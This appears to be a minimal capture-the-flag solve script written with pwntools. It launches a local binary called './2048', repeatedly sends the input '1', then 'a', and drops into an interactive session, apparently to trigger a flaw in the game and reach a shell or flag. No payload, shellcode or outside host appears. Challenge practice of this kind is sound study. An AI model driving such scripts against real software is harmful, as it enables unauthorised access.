#!/usr/bin/env python

from pwn import *

p = process("./2048")

for i in range(200):
    p.sendline("1")


p.sendline("a")

p.interactive()